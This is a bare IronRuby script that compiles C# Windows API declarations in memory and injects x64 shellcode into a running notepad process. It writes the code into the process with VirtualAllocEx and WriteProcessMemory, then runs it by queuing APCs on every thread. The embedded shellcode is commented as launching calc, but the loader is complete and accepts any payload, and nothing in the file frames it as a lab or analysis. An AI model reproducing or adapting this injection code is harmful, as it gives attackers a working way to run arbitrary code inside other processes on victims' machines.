include System::CodeDom
include Microsoft::CSharp


#x64 calc shellcde
shellcode = System::Array[System::Byte].new [ 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,
    0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,
    0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,
    0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,
    0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,
    0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,
    0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,
    0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,
    0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,
    0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,
    0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,
    0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
    0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,
    0x00,0x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,
    0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
    0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,
    0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x00]


code = %{ 
    using System;
    using System.Collections.Generic;
    using System.Text;
    using System.Runtime.InteropServices;
    namespace UnmanagedCode
    {        
        public class Injection
        {
            public static UInt32 MEM_COMMIT = 0x1000;
            public static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
            public static UInt32 PAGE_READWRITE = 0x04;
            public static UInt32 PAGE_EXECUTE_READ = 0x20;
            
            // Process privileges
            public const int PROCESS_CREATE_THREAD = 0x0002;
            public const int PROCESS_QUERY_INFORMATION = 0x0400;
            public const int PROCESS_VM_OPERATION = 0x0008;
            public const int PROCESS_VM_WRITE = 0x0020;
            public const int PROCESS_VM_READ = 0x0010;
            [Flags]
            public enum ThreadAccess : int
            {
              TERMINATE = (0x0001),
              SUSPEND_RESUME = (0x0002),
              GET_CONTEXT = (0x0008),
              SET_CONTEXT = (0x0010),
              SET_INFORMATION = (0x0020),
              QUERY_INFORMATION = (0x0040),
              SET_THREAD_TOKEN = (0x0080),
              IMPERSONATE = (0x0100),
              DIRECT_IMPERSONATION = (0x0200),
                THREAD_HIJACK = SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT,
                THREAD_ALL = TERMINATE | SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT | SET_INFORMATION | QUERY_INFORMATION | SET_THREAD_TOKEN | IMPERSONATE | DIRECT_IMPERSONATION
            }	
            
            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle,
                int dwThreadId);
            
            [DllImport("kernel32.dll",SetLastError = true)]
            public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);
            
            [DllImport("kernel32.dll")]
            public static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
            
            [DllImport("kernel32")]
            public static extern IntPtr VirtualAlloc(UInt32 lpStartAddr,
                 Int32 size, UInt32 flAllocationType, UInt32 flProtect);
            
            [DllImport("kernel32.dll", SetLastError = true )]
            public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
            Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect);
            
            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
            
            [DllImport("kernel32.dll")]
            public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress,
            int dwSize, uint flNewProtect, out uint lpflOldProtect);
        }
    }
 }

 def generate(code)
    CompilerParams = Compiler::CompilerParameters.new()
    CompilerParams.GenerateInMemory = true
    CompilerParams.TreatWarningsAsErrors = false
    CompilerParams.GenerateExecutable = false
    CompilerParams.CompilerOptions = "/optimize"
    provider = CSharpCodeProvider.new()
    compile = provider.CompileAssemblyFromSource(CompilerParams, code)
    return compile.CompiledAssembly
end

targetProcess = System::Diagnostics::Process.GetProcessesByName("notepad")[0]
assembly = generate(code)
injection = assembly.get_types()[0]
ThreadAccess = assembly.get_types()[1]

params = System::Array[System::Object].new([injection.get_field('PROCESS_VM_OPERATION').get_raw_constant_value | injection.get_field('PROCESS_VM_WRITE').get_raw_constant_value | injection.get_field('PROCESS_VM_READ').get_raw_constant_value, false, targetProcess.Id])
procHandle = injection.get_method('OpenProcess').invoke(nil, params)
params = System::Array[System::Object].new([procHandle, System::IntPtr.Zero, shellcode.Length, injection.get_field('MEM_COMMIT').get_value('UInt32'), injection.get_field('PAGE_EXECUTE_READWRITE').get_value('UInt32')])
resultPtr = injection.get_method('VirtualAllocEx').invoke(nil, params)
bytesWritten = System::IntPtr.Zero
params = System::Array[System::Object].new([procHandle, resultPtr, shellcode, shellcode.Length, bytesWritten])
resultBool = injection.get_method('WriteProcessMemory').invoke(nil, params)
oldProtect = System::UInt32.new(0)
params = System::Array[System::Object].new([procHandle, resultPtr, shellcode.Length, injection.get_field('PAGE_EXECUTE_READ').get_value('UInt32'), oldProtect])
resultBool = injection.get_method('VirtualProtectEx').invoke(nil, params)
puts "Running threads.."
for thread in targetProcess.Threads
    params = System::Array[System::Object].new([ThreadAccess.get_field('THREAD_HIJACK').get_raw_constant_value, false, thread.Id])
    tHandle = injection.get_method('OpenThread').invoke(nil, params)
    params = System::Array[System::Object].new([resultPtr, tHandle, System::IntPtr.Zero])		
	ptr = injection.get_method('QueueUserAPC').invoke(nil, params)
end
